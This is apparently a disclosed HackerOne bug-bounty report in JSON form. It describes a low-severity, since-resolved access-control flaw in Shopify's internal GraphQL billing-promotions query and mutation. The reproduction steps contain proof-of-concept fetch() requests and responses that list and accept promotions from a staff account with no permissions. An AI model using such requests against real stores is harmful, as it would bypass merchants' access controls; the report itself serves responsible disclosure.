{
  "id": 1044869,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDQ0ODY5",
  "url": "https://hackerone.com/reports/1044869",
  "title": "Staff with no permissions could possibly list and accept billing promotions",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2020-11-27T04:14:34.632Z",
  "submitted_at": "2020-11-27T04:14:34.742Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "saltymermaid",
    "url": "/saltymermaid",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/dn43gxssekzodutj70ovfe3vusis/bbbf913458c48565d99f975f7ab9fc18ad1e989aa4f8811c1209ed725333d1ec"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 1382,
    "url": "https://hackerone.com/shopify",
    "handle": "shopify",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Shopify",
      "twitter_handle": "",
      "website": "https://www.shopify.com",
      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2021-04-08T18:05:24.682Z",
  "bug_reporter_agreed_on_going_public_at": "2021-04-05T17:25:08.373Z",
  "team_member_agreed_on_going_public_at": "2021-04-08T18:05:24.594Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi,\n\n## Description\nI was looking for undocumented GraphQL API endpoints and noticed a query and mutation related to what seems to be billing promotions, but I'm not 100% sure about this since I have no idea where those promotions would come from. However, since those GraphQL endpoints were found within the billing settings scope of the application, and that the staff I used to validate this had no permissions at all, I felt like there could be missing permissions check.\n\n## Steps to reproduce\n\n1. With a staff that has no permission, send this request to possibly list applicable promotions:\n\n\t```javascript\n\tfetch(\"https://{shop}.myshopify.com/admin/internal/web/graphql/core\", {\n\t  \"headers\": {\n\t\t\"accept\": \"application/json\",\n\t\t\"accept-language\": \"fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7\",\n\t\t\"content-type\": \"application/json\",\n\t\t\"sec-fetch-dest\": \"empty\",\n\t\t\"sec-fetch-mode\": \"cors\",\n\t\t\"sec-fetch-site\": \"same-origin\",\n\t\t\"x-csrf-token\": \"{csrf-token}\",\n\t\t\"x-shopify-web-force-proxy\": \"1\"\n\t  },\n\t  \"referrerPolicy\": \"no-referrer\",\n\t  \"body\": \"{\\\"operationName\\\": \\\"Promotions\\\",\\\"query\\\": \\\"query Promotions {\\\\n shop {\\\\n  id\\\\n  applicablePromotions {\\\\n   id\\\\n   amount {\\\\n    amount\\\\n    currencyCode\\\\n    __typename\\\\n   }\\\\n   endAt\\\\n   description\\\\n   creditCategory\\\\n   promotionType\\\\n   __typename\\\\n  }\\\\n  __typename\\\\n }\\\\n}\\\"}\",\n\t  \"method\": \"POST\",\n\t  \"mode\": \"cors\",\n\t  \"credentials\": \"include\"\n\t});\n\t```\n 1.2. The response returned by this request looks like the following:\n\n\t```json\n\t{\n\t  \"data\": {\n\t\t\"shop\": {\n\t\t  \"id\": \"gid:\\\\/\\\\/shopify\\\\/Shop\\\\/45677445142\",\n\t\t  \"applicablePromotions\": [],\n\t\t  \"__typename\": \"Shop\"\n\t\t}\n\t  },\n\t  \"extensions\": {\n\t\t\"cost\": {\n\t\t  \"requestedQueryCost\": 2,\n\t\t  \"actualQueryCost\": 2,\n\t\t  \"throttleStatus\": {\n\t\t\t\"maximumAvailable\": 10000,\n\t\t\t\"currentlyAvailable\": 9998,\n\t\t\t\"restoreRate\": 500\n\t\t  }\n\t\t}\n\t  }\n\t}\n\t```\n\n2. Now, taking into consideration that the list would have return all the applicable promotions, the staff could possible accept a promotion by sending the following GrapQL request:\n\n\t```javascript\n\tfetch(\"https://{shop}.myshopify.com/admin/internal/web/graphql/core\", {\n\t  \"headers\": {\n\t\t\"accept\": \"application/json\",\n\t\t\"accept-language\": \"fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7\",\n\t\t\"content-type\": \"application/json\",\n\t\t\"sec-fetch-dest\": \"empty\",\n\t\t\"sec-fetch-mode\": \"cors\",\n\t\t\"sec-fetch-site\": \"same-origin\",\n\t\t\"x-csrf-token\": \"{csrf-token}\",,\n\t\t\"x-shopify-web-force-proxy\": \"1\"\n\t  },\n\t  \"referrerPolicy\": \"no-referrer\",\n\t  \"body\": \"{\\\"operationName\\\": \\\"applicablePromotionAccept\\\",\\\"variables\\\": { \\\"id\\\": \\\"gid://shopify/ApplicablePromotion/{promotion_id}\\\"},\\\"query\\\": \\\"mutation applicablePromotionAccept($id: ID!) {\\\\n applicablePromotionAccept(id: $id) {\\\\n  userErrors {\\\\n   field\\\\n   message\\\\n   __typename\\\\n  }\\\\n  __typename\\\\n }\\\\n}\\\"}\",\n\t  \"method\": \"POST\",\n\t  \"mode\": \"cors\",\n\t  \"credentials\": \"include\"\n\t});\n\t```\n\n 2.1. And the response returned by this request looks like the following:\n\n```json\n{\n  \"data\": {\n\t\"applicablePromotionAccept\": {\n\t  \"userErrors\": [\n\t\t{\n\t\t  \"field\": null,\n\t\t  \"message\": \"Promotion not found\",\n\t\t  \"__typename\": \"UserError\"\n\t\t}\n\t  ],\n\t  \"__typename\": \"ApplicablePromotionAcceptPayload\"\n\t}\n  },\n  \"extensions\": {\n\t\"cost\": {\n\t  \"requestedQueryCost\": 10,\n\t  \"actualQueryCost\": 10,\n\t  \"throttleStatus\": {\n\t\t\"maximumAvailable\": 10000,\n\t\t\"currentlyAvailable\": 9990,\n\t\t\"restoreRate\": 500\n\t  }\n\t}\n  }\n}\n```\n\n 2.2. Looking at the previous response from the `applicablePromotionAccept` mutation, we can see that there was no privileges issues returned, which suggests that a staff could possibly accept the promotion if the specified ID was valid.\n\n## Impact\n\nA staff with no permission could possibly list and accept what I believe to be promotions related to the account billing due to improper access control.",
  "bounty_amount": "600.0",
  "formatted_bounty": "$600",
  "weakness": {
    "id": 26,
    "name": "Improper Access Control - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 14,
  "voters": [
    "drsniper",
    "battle_angel",
    "th4nu_0x0",
    "ali",
    "h4x0r_dz",
    "dastan_9408",
    "shreky",
    "xaleraf4ra",
    "cryptographer",
    "meispi",
    "and 4 more..."
  ],
  "severity": {
    "rating": "low",
    "score": 2.5,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "local",
      "attack_complexity": "high",
      "privileges_required": "low",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "none",
      "integrity": "low",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 413,
    "asset_type": "URL",
    "asset_identifier": "your-store.myshopify.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
